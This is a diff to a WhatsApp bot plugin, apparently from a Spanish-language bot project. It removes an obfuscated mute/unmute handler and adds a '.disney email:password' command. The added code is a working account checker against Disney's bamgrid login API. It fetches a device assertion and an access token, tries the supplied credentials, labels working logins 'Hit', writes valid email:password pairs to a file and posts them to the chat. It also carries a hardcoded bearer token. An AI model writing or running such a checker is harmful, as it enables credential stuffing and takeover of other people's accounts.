@@ -1,2 +1,83 @@
-    /** By @MoonContentCreator || https://github.com/MoonContentCreator/BixbyBot-Md **/ 
-const _0x4d97af=_0xdcc1;(function(_0x211e07,_0x17a315){const _0x428539=_0xdcc1,_0x3dd36c=_0x211e07();while(!![]){try{const _0x5b6480=-parseInt(_0x428539(0x1d9))/0x1*(-parseInt(_0x428539(0x1e9))/0x2)+parseInt(_0x428539(0x1c5))/0x3*(parseInt(_0x428539(0x1d4))/0x4)+-parseInt(_0x428539(0x1d5))/0x5*(parseInt(_0x428539(0x1de))/0x6)+-parseInt(_0x428539(0x1df))/0x7*(parseInt(_0x428539(0x1cc))/0x8)+-parseInt(_0x428539(0x1c6))/0x9*(-parseInt(_0x428539(0x1cf))/0xa)+parseInt(_0x428539(0x1d3))/0xb*(-parseInt(_0x428539(0x1d6))/0xc)+parseInt(_0x428539(0x1e2))/0xd*(parseInt(_0x428539(0x1dc))/0xe);if(_0x5b6480===_0x17a315)break;else _0x3dd36c['push'](_0x3dd36c['shift']());}catch(_0x3a883a){_0x3dd36c['push'](_0x3dd36c['shift']());}}}(_0x3c43,0xc4b2b));import _0x6e4a4f from'node-fetch';import _0x38606d from'fs';function _0xdcc1(_0x2d9a08,_0xff3539){const _0x3c4377=_0x3c43();return _0xdcc1=function(_0xdcc1a5,_0x270b6d){_0xdcc1a5=_0xdcc1a5-0x1c3;let _0x5aa08f=_0x3c4377[_0xdcc1a5];return _0x5aa08f;},_0xdcc1(_0x2d9a08,_0xff3539);}const handler=async(_0x4fabbd,{conn:_0xee23ae,command:_0x567d14,text:_0x2a4858,isAdmin:_0x5d2cdb})=>{const _0x3c2c65=_0xdcc1;if(_0x567d14===_0x3c2c65(0x1e4)){if(!_0x5d2cdb)throw'Sólo\x20un\x20administrador\x20puede\x20ejecutar\x20este\x20comando\x20👑';let _0x7b97fc=_0x4fabbd['mentionedJid'][0x0]?_0x4fabbd[_0x3c2c65(0x1d0)][0x0]:_0x4fabbd['quoted']?_0x4fabbd['quoted']['sender']:_0x2a4858,_0x5bf87c=global['db']['data']['users'][_0x7b97fc],_0x3927e4={'key':{'participants':_0x3c2c65(0x1c4),'fromMe':![],'id':_0x3c2c65(0x1e3)},'message':{'locationMessage':{'name':_0x3c2c65(0x1cd),'jpegThumbnail':await(await _0x6e4a4f('https://telegra.ph/file/f8324d9798fa2ed2317bc.png'))[_0x3c2c65(0x1e0)](),'vcard':_0x3c2c65(0x1ca)}},'participant':_0x3c2c65(0x1c4)},_0x4fb3e2=_0x3c2c65(0x1db);if(!_0x4fabbd[_0x3c2c65(0x1d0)][0x0]&&!_0x4fabbd['quoted'])return _0xee23ae['reply'](_0x4fabbd[_0x3c2c65(0x1e8)],_0x4fb3e2,_0x4fabbd);if(_0x5bf87c['muto']===!![])throw _0x3c2c65(0x1c3);_0xee23ae[_0x3c2c65(0x1ce)](_0x4fabbd['chat'],_0x3c2c65(0x1e7),_0x3927e4,null,{'mentions':[_0x7b97fc]}),global['db'][_0x3c2c65(0x1c9)][_0x3c2c65(0x1c8)][_0x7b97fc]['muto']=!![];}if(_0x567d14===_0x3c2c65(0x1da)){if(!_0x5d2cdb)throw _0x4fabbd['reply']('Sólo\x20un\x20administrador\x20puede\x20ejecutar\x20este\x20comando\x20👑');let _0x13766a=_0x4fabbd[_0x3c2c65(0x1d0)][0x0]?_0x4fabbd[_0x3c2c65(0x1d0)][0x0]:_0x4fabbd['quoted']?_0x4fabbd[_0x3c2c65(0x1e1)][_0x3c2c65(0x1e6)]:_0x2a4858,_0x2ab1aa=global['db'][_0x3c2c65(0x1c9)]['users'][_0x13766a],_0x176218={'key':{'participants':'0@s.whatsapp.net','fromMe':![],'id':_0x3c2c65(0x1e3)},'message':{'locationMessage':{'name':_0x3c2c65(0x1e5),'jpegThumbnail':await(await _0x6e4a4f(_0x3c2c65(0x1d1)))[_0x3c2c65(0x1e0)](),'vcard':_0x3c2c65(0x1ca)}},'participant':_0x3c2c65(0x1c4)},_0x4b277c=_0x3c2c65(0x1d7);if(_0x13766a===_0x4fabbd[_0x3c2c65(0x1e6)])throw _0x3c2c65(0x1d8);if(!_0x4fabbd[_0x3c2c65(0x1d0)][0x0]&&!_0x4fabbd[_0x3c2c65(0x1e1)])return _0xee23ae[_0x3c2c65(0x1ce)](_0x4fabbd[_0x3c2c65(0x1e8)],_0x4b277c,_0x4fabbd);global['db'][_0x3c2c65(0x1c9)][_0x3c2c65(0x1c8)][_0x13766a][_0x3c2c65(0x1cb)]=![],_0xee23ae[_0x3c2c65(0x1ce)](_0x4fabbd['chat'],'Tus\x20mensajes\x20ya\x20no\x20serán\x20eliminados',_0x176218,null,{'mentions':[_0x13766a]});}};handler[_0x4d97af(0x1d2)]=/^(mute|unmute)$/i,handler[_0x4d97af(0x1c7)]=!![],handler[_0x4d97af(0x1dd)]=!![],handler['botAdmin']=!![];function _0x3c43(){const _0x3942e2=['Usuario\x20demutado','sender','Tus\x20mensajes\x20serán\x20eliminados','chat','2gDMuTc','Este\x20usuario\x20ya\x20ha\x20sido\x20mutado','0@s.whatsapp.net','3fTfzYn','193095IWDrZq','group','users','data','BEGIN:VCARD\x0aVERSION:3.0\x0aN:;Unlimited;;;\x0aFN:Unlimited\x0aORG:Unlimited\x0aTITLE:\x0aitem1.TEL;waid=19709001746:+1\x20(970)\x20900-1746\x0aitem1.X-ABLabel:Unlimited\x0aX-WA-BIZ-DESCRIPTION:ofc\x0aX-WA-BIZ-NAME:Unlimited\x0aEND:VCARD','muto','8792VHCUEu','Usuario\x20mutado','reply','750VhhpMY','mentionedJid','https://telegra.ph/file/aea704d0b242b8c41bf15.png','command','2053183UTVnmB','3152668HMrzhz','70BaykWJ','12DimAAy','Menciona\x20a\x20quién\x20deseas\x20demutar.','No\x20puedes\x20desmutarte,\x20pídele\x20a\x20un\x20administrador\x20que\x20te\x20desmute.','172075qSskak','unmute','mutare','896zGHKqq','admin','613596YKpmWP','5439XIfvIK','buffer','quoted','143936OYqkuq','Halo','mute'];_0x3c43=function(){return _0x3942e2;};return _0x3c43();}export default handler;
+import axios from 'axios';
+import fs from 'fs';
+import path from 'path';
+
+let handler = async (m, { conn, command, text, args, usedPrefix }) => {
+  // Comando .Disney mail:pass
+  if (command === 'disney') {
+    const [email, password] = text.split(':');
+
+    if (!email || !password) {
+      return conn.reply(m.chat, 'Formato inválido. Usa el formato: `.Disney email:password`', m);
+    }
+
+    let hits = 0;
+    let bad = 0;
+
+    try {
+      // Crear directorio donde guardar los resultados
+      const dir = path.join(__dirname, '/sdcard/HJ_Disney');
+      if (!fs.existsSync(dir)) {
+        fs.mkdirSync(dir, { recursive: true });
+      }
+
+      // Configurar sesión y headers
+      const session = axios.create();
+      const headers = {
+        'content-type': 'application/json',
+        'authorization': 'Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+      };
+
+      // Hacer la primera petición para obtener el assertion
+      const deviceData = JSON.stringify({ deviceFamily: "browser", applicationRuntime: "chrome", deviceProfile: "windows", attributes: {} });
+      const deviceResponse = await session.post('https://global.edge.bamgrid.com/devices', { headers, data: deviceData });
+      const assertion = deviceResponse.data.assertion;
+
+      if (!assertion) {
+        return conn.reply(m.chat, `Fallo al obtener assertion para ${email}`, m);
+      }
+
+      // Hacer la segunda petición para obtener el token de acceso
+      const tokenData = `grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token=${assertion}&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Adevice`;
+      const tokenResponse = await session.post('https://global.edge.bamgrid.com/token', { headers: { ...headers, 'content-type': 'application/x-www-form-urlencoded' }, data: tokenData });
+      const accessToken = tokenResponse.data.access_token;
+
+      if (!accessToken) {
+        return conn.reply(m.chat, `Fallo al obtener el access token para ${email}`, m);
+      }
+
+      // Realizar login con las credenciales del usuario
+      const loginHeaders = { ...headers, 'authorization': `Bearer ${accessToken}` };
+      const loginData = JSON.stringify({ email, password });
+      const loginResponse = await session.post('https://global.edge.bamgrid.com/idp/login', { headers: loginHeaders, data: loginData });
+
+      // Verificar si el login fue exitoso
+      if (loginResponse.data.includes('id_token')) {
+        hits++;
+        const successMessage = `Hit -> ${email}:${password} | By: @hjofc123`;
+        console.log("\x1b[32m" + successMessage + "\x1b[0m");
+
+        // Guardar el hit en el archivo
+        fs.appendFileSync(path.join(__dirname, '/sdcard/HJ_Disney/Disney.txt'), `${email}:${password}\n${successMessage}\n`);
+        conn.reply(m.chat, successMessage, m);
+      } else {
+        bad++;
+        console.log("\x1b[31mBAD Account >>", email, "\x1b[0m");
+        conn.reply(m.chat, `BAD Account >> ${email}`, m);
+      }
+    } catch (error) {
+      console.error('Error:', error);
+      bad++;
+      conn.reply(m.chat, `Error al verificar las credenciales para ${email}. Intenta nuevamente más tarde.`, m);
+    }
+
+    // Resumen final
+    conn.reply(m.chat, `\nResumen final:\nHits ✅: ${hits}\nBad ❌: ${bad}\n`, m);
+  }
+};
+
+// Establecer el comando
+handler.command = ['disney'];
+
+export default handler;
